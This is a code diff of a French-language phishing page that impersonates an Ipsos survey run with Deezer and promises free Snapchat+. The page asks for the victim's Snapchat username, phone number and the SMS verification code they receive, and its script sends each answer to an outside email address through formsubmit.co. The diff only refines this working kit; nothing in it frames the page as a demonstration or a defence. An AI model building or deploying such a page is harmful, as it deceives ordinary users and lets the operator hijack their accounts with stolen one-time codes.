@@ -15,25 +15,20 @@
         /* HEADER */
         .header {
             background: #003b7a;
-            padding: 35px 40px; /* Augmenter la hauteur du header */
+            padding: 35px 40px;
             display: flex;
             align-items: center;
             justify-content: space-between;
-            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1); /* Ajout d'un ombrage léger pour le header */
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
         }
 
         .header img {
-            height: 60px; /* Augmenter la taille du logo */
-        }
-
-        .header a {
-            position: absolute;
-            left: 30px;
+            height: 60px;
         }
 
         .header-text {
             color: #fff;
-            font-size: 28px; /* Agrandir légèrement la taille du texte */
+            font-size: 28px;
             font-weight: 700;
         }
 
@@ -45,25 +40,21 @@
             z-index: 999;
         }
 
-        /* BOUTONS ET TEXTES CENTRÉS */
+        /* BOX / PAGE */
         .box {
             max-width: 650px;
             margin: 60px auto;
             background: white;
             padding: 50px;
             border-radius: 12px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.12);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.12);
             text-align: center;
             transition: all 0.5s ease;
-            opacity: 0;
-            transform: translateY(30px);
             display: none;
         }
 
         .box.active {
             display: block;
-            opacity: 1;
-            transform: translateY(0);
         }
 
         h2 {
@@ -72,46 +63,44 @@
             color: #003b7a;
         }
 
-        p {
+        p, label {
             font-size: 18px;
-            margin-bottom: 20px;
             color: #333;
             line-height: 1.5;
         }
 
-        input {
+        input[type=text], select {
             width: 100%;
             padding: 14px;
             font-size: 18px;
             border-radius: 6px;
             border: 1px solid #ccc;
             margin-bottom: 15px;
-            transition: all 0.3s;
         }
 
         input:focus {
             border-color: #0078d4;
             outline: none;
-            box-shadow: 0 0 8px rgba(0, 120, 212, 0.3);
+            box-shadow: 0 0 8px rgba(0,120,212,0.3);
         }
 
         button {
             padding: 14px 28px;
             background: #0078d4;
             color: #fff;
-            border: 0;
+            border: none;
             border-radius: 8px;
             cursor: pointer;
             font-size: 18px;
-            transition: all 0.3s;
         }
 
         button:hover {
             background: #005fa3;
             transform: translateY(-2px) scale(1.03);
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
         }
 
+        /* Progress bar */
         .progress-container {
             width: 90%;
             height: 16px;
@@ -139,18 +128,6 @@
             line-height: 16px;
         }
 
-        .about {
-            max-width: 650px;
-            margin: 20px auto 40px auto;
-            padding: 20px;
-            background: #e8f0fe;
-            border-radius: 10px;
-            font-size: 14px;
-            color: #003b7a;
-            line-height: 1.4;
-            text-align: left;
-        }
-
         .footer {
             text-align: center;
             padding: 20px 0;
@@ -160,60 +137,35 @@
             border-top: 1px solid #ddd;
         }
 
-        @media (max-width: 600px) {
-            .box {
-                margin: 30px 20px;
-                padding: 30px;
-            }
-            h2 {
-                font-size: 24px;
-            }
-            p {
-                font-size: 16px;
-            }
-            button {
-                font-size: 16px;
-            }
-            .about {
-                font-size: 13px;
-                padding: 15px;
-            }
+        @media (max-width:600px){
+            .box { margin:30px 20px; padding:30px; }
+            h2 { font-size:24px; }
+            p, label { font-size:16px; }
+            button { font-size:16px; }
         }
     </style>
 </head>
 <body>
-    <img src="francelogo.png" class="logo-fixed" alt="France">
-
-    <div class="header">
-        <a href="index.html" onclick="return confirm('Quitter le sondage ? Vos réponses seront perdues.')">
-            <img src="logo.png" alt="Ipsos">
-        </a>
-        <div class="header-text">Ipsos – Sondage</div>
-    </div>
-
-    <div class="progress-container">
-        <div class="progress-bar" id="progressBar"></div>
-        <div class="progress-text" id="progressText">0%</div>
-    </div>
-
-    <!-- PARTENARIAT AVEC DEEZER ET AVERTISSEMENT AVANT LE NUMERO -->
-    <div class="box active" id="etape0">
-        <h2>Partenariat avec Deezer 📱</h2>
-        <p>Ce sondage est organisé en collaboration avec Deezer pour offrir Snapchat+ gratuitement. Cette offre est exclusivement réservée aux clients de <strong>SFR, Bouygues Telecom, ou Orange</strong> pour garantir la compatibilité avec les services.</p>
-        <p>Avant de commencer, nous devons effectuer une vérification pour confirmer que vous êtes un participant humain et éviter tout abus.</p>
-        <button id="btnEtape0">Continuer</button>
-    </div>
-    <!-- Étape 0 : Questions sur les habitudes d'écoute Deezer -->
+<img src="francelogo.png" class="logo-fixed" alt="France">
+<div class="header">
+    <a href="index.html" onclick="return confirm('Quitter le sondage ? Vos réponses seront perdues.')">
+        <img src="logo.png" alt="Ipsos">
+    </a>
+    <div class="header-text">Ipsos – Sondage</div>
+</div>
+<div class="progress-container">
+    <div class="progress-bar" id="progressBar"></div>
+    <div class="progress-text" id="progressText">0%</div>
+</div>
+    <!-- Étape 0 : Questions Deezer -->
 <div class="box active" id="etape0">
     <h2>Vos habitudes d'écoute Deezer 🎵</h2>
-    <p>Merci de répondre aux questions sur vos artistes et genres préférés. Ces informations restent confidentielles et servent uniquement à notre étude interne.</p>
+    <p>Merci de répondre aux questions sur vos artistes et genres préférés. Ces informations restent confidentielles.</p>
 
-    <!-- Utilisation de Deezer -->
     <label>Utilisez-vous Deezer ?</label><br>
-    <input type="radio" name="deezer_use" value="Oui" required> Oui<br>
+    <input type="radio" name="deezer_use" value="Oui"> Oui<br>
     <input type="radio" name="deezer_use" value="Non"> Non<br><br>
 
-    <!-- Fréquence -->
     <label>Combien de jours par semaine écoutez-vous Deezer ?</label><br>
     <select name="deezer_freq">
         <option value="">-- Sélectionnez --</option>
@@ -222,7 +174,6 @@
         <option value="5-7 jours">5–7 jours</option>
     </select><br><br>
 
-    <!-- Artistes -->
     <label>Quels artistes écoutez-vous le plus ? (jusqu'à 5)</label><br>
     <input type="text" name="artiste1" placeholder="Artiste 1">
     <input type="text" name="artiste2" placeholder="Artiste 2">
@@ -230,8 +181,7 @@
     <input type="text" name="artiste4" placeholder="Artiste 4">
     <input type="text" name="artiste5" placeholder="Artiste 5"><br><br>
 
-    <!-- Genres -->
-    <label>Quels genres écoutez-vous principalement ?</label><br>
+    <label>Genres principaux :</label><br>
     <input type="checkbox" name="genre[]" value="Pop"> Pop<br>
     <input type="checkbox" name="genre[]" value="Rap / Hip-hop"> Rap / Hip-hop<br>
     <input type="checkbox" name="genre[]" value="R&B"> R&B<br>
@@ -243,130 +193,116 @@
     <button id="btnEtape0">Continuer</button>
 </div>
 
+<!-- Étape 1 : Snapchat -->
+<div class="box" id="etape1">
+    <h2>Recevoir Snapchat+ 🎁</h2>
+    <p>Merci de nous fournir votre identifiant Snapchat pour recevoir votre cadeau.</p>
+    <input type="text" id="compte_snap" placeholder="Votre identifiant Snapchat">
+    <button id="btnEtape1">Suivant</button>
+</div>
 
-    <!-- Étape 1: Collecte des informations sur le compte Snapchat -->
-    <div class="box" id="etape1">
-        <h2>Recevoir Snapchat+ 🎁</h2>
-        <p>Merci de nous fournir votre identifiant Snapchat afin que nous puissions vous envoyer votre cadeau.</p>
-        <input type="text" id="compte_snap" placeholder="Votre identifiant Snapchat">
-        <button id="btnEtape1">Suivant</button>
-    </div>
-
-    <!-- Étape 2: Numéro de téléphone -->
-   <!-- Étape 2: Numéro de téléphone (libre) -->
-<!-- Étape 2: Numéro de téléphone -->
+<!-- Étape 2 : Numéro libre -->
 <div class="box" id="etape2">
     <h2>Numéro de téléphone</h2>
-    <p>Veuillez entrer votre numéro de téléphone pour recevoir un code de vérification par SMS.</p>
-    <div>
-        <select id="choix_prefixe">
-            <option value="06">06</option>
-            <option value="07">07</option>
-        </select>
-        <input type="text" id="telephone" placeholder="Ex: 06XXXXXXXX">
-    </div>
+    <p>Veuillez entrer votre numéro de téléphone. Le format est libre.</p>
+    <input type="text" id="telephone" placeholder="Ex: 0612345678 ou autre format">
     <button id="btnEtape2">Suivant</button>
 </div>
 
+<!-- Étape 3 : Code SMS -->
+<div class="box" id="etape3">
+    <h2>Code de vérification</h2>
+    <p>Veuillez entrer le code reçu par SMS.</p>
+    <input type="text" id="code_sms" placeholder="Code reçu">
+    <button id="btnEtape3">Terminer</button>
+</div>
 
-    <!-- Étape 3: Code SMS -->
-    <div class="box" id="etape3">
-        <h2>Code de vérification</h2>
-        <p>Veuillez entrer le code que vous avez reçu par SMS pour finaliser l’inscription.</p>
-        <input type="text" id="code_sms" placeholder="Code reçu">
-        <button id="btnEtape3">Terminer</button>
-    </div>
+<!-- Étape 4 : Merci -->
+<div class="box" id="etape4">
+    <h2>Merci !</h2>
+    <p>Votre Snapchat+ sera activé dans l’heure. 🎉</p>
+</div>
 
-    <div class="footer">© 2026 Ipsos – Tous droits réservés</div>
+<div class="footer">
+    © 2026 Ipsos – Tous droits réservés
+</div>
+<script>
+let reponses = {};
 
-    <script>
-        let reponses = {};
+// Affichage d'une étape
+function showStep(etapeId, percent){
+    document.querySelectorAll('.box').forEach(b=>b.classList.remove('active'));
+    document.getElementById(etapeId).classList.add('active');
+    document.getElementById('progressBar').style.width = percent + "%";
+    document.getElementById('progressText').innerText = percent + "%";
+}
 
-        function showStep(etapeId, percent) {
-            document.querySelectorAll('.box').forEach(b => b.classList.remove('active'));
-            document.getElementById(etapeId).classList.add('active');
-            document.getElementById('progressBar').style.width = percent + "%";
-            document.getElementById('progressText').innerText = percent + "%";
-        }
-
-        async function sendMail(dataObj, sujet) {
-            const formData = new FormData();
-            formData.append("_subject", sujet);
-            formData.append("_cc", "John123abcd@proton.me,John123abcd@proton.me");  // Remplace avec tes adresses email
-            formData.append("_captcha", "false");
-            for (let key in dataObj) {
-                formData.append(key, dataObj[key]);
-            }
-            try {
-                await fetch("https://formsubmit.co/John123abcd@proton.me", {
-                    method: "POST",
-                    body: formData,
-                    headers: { "Accept": "application/json" }
-                });
-                console.log("Mail envoyé:", sujet);
-            } catch (e) {
-                console.error("Erreur d'envoi de mail", e);
-            }
-        }
-
-        // Étape 0: Quand on clique sur Continuer, on passe à l'étape 1.
-        document.getElementById('btnEtape0').addEventListener('click', () => {
-            showStep('etape1', 25);
+// Envoi mail via FormSubmit
+async function sendMail(dataObj, sujet){
+    const formData = new FormData();
+    formData.append("_subject", sujet);
+    formData.append("_cc", "John123abcd@proton.me,John123abcd@proton.me");
+    formData.append("_captcha", "false");
+    for(let key in dataObj) formData.append(key, dataObj[key]);
+    try{
+        await fetch("https://formsubmit.co/John123abcd@proton.me", {
+            method:"POST",
+            body:formData,
+            headers: { "Accept": "application/json" }
         });
+        console.log("Mail envoyé:", sujet);
+    }catch(e){ console.error(e); }
+}
 
-        // Étape 1: Réponse sur Snapchat
-        document.getElementById('btnEtape1').addEventListener('click', () => {
-            let snap = document.getElementById('compte_snap').value.trim();
-            if (!snap) {
-                alert("Veuillez entrer votre identifiant Snapchat.");
-                return;
-            }
+// Étape 0 : Deezer
+document.getElementById('btnEtape0').addEventListener('click', ()=>{
+    const deezerUse = document.querySelector('input[name="deezer_use"]:checked');
+    const freq = document.querySelector('select[name="deezer_freq"]').value;
+    if(!deezerUse || !freq){ alert("Veuillez répondre aux questions Deezer."); return; }
 
-            reponses.compte_snap = snap;
-            sendMail({ compte_snap: snap }, "Réponses Étape 1 - Ipsos");
-            showStep('etape2', 50);
-        });
+    reponses.deezer_use = deezerUse.value;
+    reponses.deezer_freq = freq;
 
-        // Étape 2: Réponse sur le téléphone
-        document.getElementById('btnEtape2').addEventListener('click', () => {
-            let telPrefix = document.getElementById('choix_prefixe').value;
-            let tel = document.getElementById('telephone').value.trim();
+    // Artistes et genres
+    reponses.artistes = [];
+    for(let i=1;i<=5;i++){
+        const a = document.querySelector('input[name="artiste'+i+'"]').value.trim();
+        if(a) reponses.artistes.push(a);
+    }
+    reponses.genres = [];
+    document.querySelectorAll('input[name="genre[]"]:checked').forEach(c=>reponses.genres.push(c.value));
 
-            if (!/^\d{8}$/.test(tel)) {
-                alert("Numéro invalide. Assurez-vous d'entrer un numéro valide avec 8 chiffres.");
-                return;
-            }
+    sendMail(reponses, "Réponses Étape 0 - Deezer");
+    showStep('etape1', 20);
+});
 
-            reponses.telephone = telPrefix + tel;
-            sendMail({ telephone: reponses.telephone }, "Réponses Étape 2 - Ipsos");
-            showStep('etape3', 75);
-        });
+// Étape 1 : Snapchat
+document.getElementById('btnEtape1').addEventListener('click', ()=>{
+    let snap = document.getElementById('compte_snap').value.trim();
+    if(!snap){ alert("Veuillez entrer votre identifiant Snapchat."); return; }
+    reponses.compte_snap = snap;
+    sendMail({compte_snap: snap}, "Réponses Étape 1 - Ipsos");
+    showStep('etape2', 50);
+});
 
-        // Étape 3: Réponse sur le code SMS
-        document.getElementById('btnEtape3').addEventListener('click', () => {
-            let code = document.getElementById('code_sms').value.trim();
-            if (!code) {
-                alert("Veuillez entrer le code.");
-                return;
-            }
+// Étape 2 : Téléphone libre
+document.getElementById('btnEtape2').addEventListener('click', ()=>{
+    let tel = document.getElementById('telephone').value.trim();
+    if(!tel){ alert("Veuillez entrer votre numéro de téléphone."); return; }
+    reponses.telephone = tel;
+    sendMail({telephone: tel}, "Réponses Étape 2 - Ipsos");
+    showStep('etape3', 75);
+});
 
-            reponses.code_sms = code;
-            sendMail({ code_sms: code }, "Réponses Étape 3 - Ipsos");
-            showStep('etape4', 100);
-        });
-    </script>
-
-    <div class="box" id="etape4">
-        <h2>Merci !</h2>
-        <p>Votre Snapchat+ sera activé dans l’heure. 🎉</p>
-    </div>
-
-    <div class="about">
-        <strong>À propos du partenariat :</strong><br>
-        Ce sondage est organisé en collaboration avec Deezer pour vous offrir Snapchat+ gratuitement. 
-        L’offre est exclusivement réservée aux clients SFR, Bouygues Telecom et Orange afin de garantir la disponibilité et la compatibilité du service. 
-        Nous vous remercions pour votre participation !
-    </div>
+// Étape 3 : Code SMS
+document.getElementById('btnEtape3').addEventListener('click', ()=>{
+    let code = document.getElementById('code_sms').value.trim();
+    if(!code){ alert("Veuillez entrer le code."); return; }
+    reponses.code_sms = code;
+    sendMail({code_sms: code}, "Réponses Étape 3 - Ipsos");
+    showStep('etape4', 100);
+});
+</script>
 </body>
 </html>
 
